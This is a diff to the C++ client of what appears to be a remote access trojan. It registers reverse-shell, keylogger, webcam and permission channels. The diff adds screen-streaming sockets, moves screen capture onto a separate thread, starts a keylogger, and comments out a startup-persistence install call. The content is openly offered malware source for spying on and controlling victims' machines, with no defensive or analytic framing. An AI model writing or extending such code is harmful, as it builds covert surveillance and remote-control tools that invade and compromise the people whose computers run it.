@@ -31,7 +31,9 @@ std::vector<std::string> socket_conf_list = {"MAIN",
                                              "REVERSE_SHELL",
                                              "KEYLOGGER",
                                              "PERMISSION",
-                                             "WEBCAM"};
+                                             "WEBCAM",
+                                             "SCREEN",
+                                             "SCREEN_EVENT"};
 
 void add_connection(const std::string &key, Stream &stream) {
     std::lock_guard<std::mutex> lock(connections_mutex);
@@ -95,7 +97,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
         KeyLogger keyLogger(Stream(0));
         keyLogger.tryStart();
 //#endif
-        Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
+        //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool connectionState = true;
         while (connectionState) {
             nlohmann::json jsonObject;
@@ -115,6 +117,9 @@ int main(int argc = 0, char *argv[] = nullptr) {
             stream = *get_connection("WEBCAM");
             DeviceEnumerator deviceEnumerator(stream);
             WebcamManager webcamManager(stream);
+            stream = *get_connection("SCREEN");
+            Stream altStream = *get_connection("SCREEN_EVENT");
+            ScreenStreamer screenStreamer(stream, altStream);
             stream = *get_connection("MAIN");
             MessageBoxGUI messageBoxGUI(stream);
             KeyboardExecuter keyboardExecuter(stream);
@@ -237,8 +242,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
                     }
 #ifdef WEBCAM
                     case 22: { // downloadContent screen streaming TODO fix screen controlling and new thread and socket
-                        ScreenStreamer screenStreamer(stream);
-                        screenStreamer.send();
+                        threadGen.runInNewThread(&screenStreamer, &ScreenStreamer::startStreaming, jsonObject);
                         break;
                     }
 #endif
